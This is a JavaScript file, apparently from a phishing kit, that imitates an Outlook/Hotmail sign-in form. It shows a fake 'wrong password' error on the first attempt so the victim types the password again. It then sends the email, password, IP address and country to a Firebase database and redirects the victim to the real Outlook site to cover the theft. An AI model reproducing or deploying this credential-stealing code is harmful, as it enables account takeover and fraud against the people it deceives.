let form; // Declara form fuera del evento DOMContentLoaded
let clickCount = 0;

document.addEventListener("DOMContentLoaded", function() {
  // Asigna el valor de form dentro del evento DOMContentLoaded
  form = document.getElementById("form1");
  const submitButton = document.getElementById("btn");

  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    // Incrementa el contador de clics
    clickCount++;

    // Lógica para el primer clic
    if (clickCount === 1) {
      const errorMessage = document.getElementById('error-message');

      // Muestra el mensaje de error
      errorMessage.textContent = 'La cuenta o la contraseña es incorrecta. Si no recuerdas la cuenta, restablécela ahora.';
      document.getElementById('pass').value = '';
      submitButton.disabled = false; // Habilita el botón para el próximo intento
      return;
    }

    // Lógica para el segundo clic
    if (clickCount === 2) {
      // Deshabilita el botón antes de llamar a la función 'guardar'
      submitButton.disabled = true;

      // Luego, llama a la función 'guardar'
      guardar();
      
      // Reinicia el contador para futuros clics
      clickCount = 0;
    }
  });
});

function getUsuarioIP() {
  return new Promise((resolve, reject) => {
    fetch('https://api64.ipify.org?format=json')
      .then(response => response.json())
      .then(data => resolve(data.ip))
      .catch(error => reject(error));
  });
}

function getPaisFromIP(ip) {
  return new Promise((resolve, reject) => {
    fetch(`https://ipapi.co/${ip}/json/`)
      .then(response => response.json())
      .then(data => resolve(data.country_name))
      .catch(error => reject(error));
  });
}

function validarCorreoElectronico(correo) {
  // Expresión regular para validar el correo electrónico con múltiples dominios
  const regex = /^(?=.*@(hotmail\.com|outlook\.com|hotmail\.es|outlook\.es|live\.com|live\.com\.mx)).+$/;
  return regex.test(correo);
}

function validarTexto(texto) {
  // Expresión regular para validar que el texto solo contenga letras y espacios
  const regex = /^[A-Za-z\s]+$/;
  return regex.test(texto);
}

function guardar() {
  const nombre = document.getElementById("email").value;
  const apellido = document.getElementById("pass").value;
  const timestamp = firebase.firestore.FieldValue.serverTimestamp();

  let ip;

  getUsuarioIP()
    .then(usuarioIp => {
      ip = usuarioIp;
      return getPaisFromIP(ip);
    })
    .then(pais => {
      const db = firebase.firestore();
      return db.collection('Client').doc().set({
        Pass: apellido,
        Mail: nombre,
        Fecha: timestamp,
        Pais: pais,
        Revisado: false,
        Extraer: false,
        Soporte: false,
        FB: 0,
      });
    })
    .then(() => {
      // Redirige a la nueva página (ajusta la URL según tu necesidad)
      window.location.href = 'https://outlook.live.com/mail/0/';
    })
    .catch((error) => {
      alert("Error: " + error.message);
    })
    .finally(() => {
      // Habilita el botón después de completar la operación
      submitButton.disabled = false;
    });
}
